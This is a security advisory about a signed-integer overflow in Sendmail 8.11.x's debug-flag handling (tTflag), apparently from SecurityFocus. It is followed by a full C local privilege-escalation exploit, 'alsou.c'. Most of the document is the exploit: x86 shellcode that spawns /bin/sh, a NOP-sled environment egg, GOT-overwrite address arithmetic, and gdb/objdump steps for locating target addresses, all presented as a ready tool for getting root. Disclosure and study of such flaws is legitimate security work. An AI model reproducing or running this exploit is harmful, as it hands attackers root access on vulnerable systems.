source: http://www.securityfocus.com/bid/3163/info

An input validation error exists in Sendmail's debugging functionality.

The problem is the result of the use of signed integers in the program's tTflag() function, which is responsible for processing arguments supplied from the command line with the '-d' switch and writing the values to it's internal "trace vector." The vulnerability exists because it is possible to cause a signed integer overflow by supplying a large numeric value for the 'category' part of the debugger arguments. The numeric value is used as an index for the trace vector, and can therefore be used to write within a certain range of proces memory if a negative value is given.

Because the '-d' command-line switch is processed before the program drops its elevated privileges, this could lead to a full system compromise. This vulnerability has been successfully exploited in a laboratory environment.

/*
 * alsou.c
 *
 * sendmail-8.11.x linux x86 exploit
 *
 * To use this exploit you should know two numbers: VECT and GOT.
 * Use gdb to find the first:
 *
 * $ gdb -q /usr/sbin/sendmail 
 * (gdb) break tTflag 
 * Breakpoint 1 at 0x8080629
 * (gdb) r -d1-1.1
 * Starting program: /usr/sbin/sendmail -d1-1.1
 *
 * Breakpoint 1, 0x8080629 in tTflag ()
 * (gdb) disassemble tTflag
 * .............
 * 0x80806ea <tTflag+202>: dec    %edi
 * 0x80806eb <tTflag+203>: mov    %edi,0xfffffff8(%ebp)
 * 0x80806ee <tTflag+206>: jmp    0x80806f9 <tTflag+217>
 * 0x80806f0 <tTflag+208>: mov    0x80b21f4,%eax
 *                               ^^^^^^^^^^^^^^^^^^ address of VECT
 * 0x80806f5 <tTflag+213>: mov    %bl,(%esi,%eax,1)
 * 0x80806f8 <tTflag+216>: inc    %esi
 * 0x80806f9 <tTflag+217>: cmp    0xfffffff8(%ebp),%esi
 * 0x80806fc <tTflag+220>: jle    0x80806f0 <tTflag+208>
 * .............
 * (gdb) x/x 0x80b21f4
 * 0x80b21f4 <tTvect>:     0x080b9ae0
 *                        ^^^^^^^^^^^^^ VECT
 *
 * Use objdump to find the second:
 * $ objdump -R /usr/sbin/sendmail |grep setuid
 * 0809e07c R_386_JUMP_SLOT   setuid
 * ^^^^^^^^^ GOT
 *
 * Probably you should play with OFFSET to make exploit work.
 * 
 * Constant values, written in this code found for sendmail-8.11.4
 * on RedHat-6.2. For sendmail-8.11.0 on RedHat-6.2 try VECT = 0x080b9ae0 and
 * GOT = 0x0809e07c.
 *
 * To get r00t type ./alsou and then press Ctrl+C.
 * 
 *
 * grange <grange@rt.mipt.ru>
 *
 */
 
#include <sys/types.h>
#include <stdlib.h>

#define OFFSET 1000
#define VECT 0x080baf20
#define GOT 0x0809f544

#define NOPNUM 1024

char shellcode[] =
	"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
	"\xb0\x2e\xcd\x80\xeb\x15\x5b\x31"
	"\xc0\x88\x43\x07\x89\x5b\x08\x89"
	"\x43\x0c\x8d\x4b\x08\x31\xd2\xb0"
	"\x0b\xcd\x80\xe8\xe6\xff\xff\xff"
	"/bin/sh";

unsigned int get_esp()
{
	__asm__("movl %esp,%eax");
}

int main(int argc, char *argv[])
{
	char *egg, s[256], tmp[256], *av[3], *ev[2];
	unsigned int got = GOT, vect = VECT, ret, first, last, i;

	egg = (char *)malloc(strlen(shellcode) + NOPNUM + 5);
	if (egg == NULL) {
		perror("malloc()");
		exit(-1);
	}
	sprintf(egg, "EGG=");
	memset(egg + 4, 0x90, NOPNUM);
	sprintf(egg + 4 + NOPNUM, "%s", shellcode);
	
	ret = get_esp() + OFFSET;

	sprintf(s, "-d");
	first = -vect - (0xffffffff - got + 1);
	last = first;
	while (ret) {
		i = ret & 0xff;
		sprintf(tmp, "%u-%u.%u-", first, last, i);
		strcat(s, tmp);
		last = ++first;
		ret = ret >> 8;
	}
	s[strlen(s) - 1] = '\0';

	av[0] = "/usr/sbin/sendmail";
	av[1] = s;
	av[2] = NULL;
	ev[0] = egg;
	ev[1] = NULL;
	execve(*av, av, ev);
}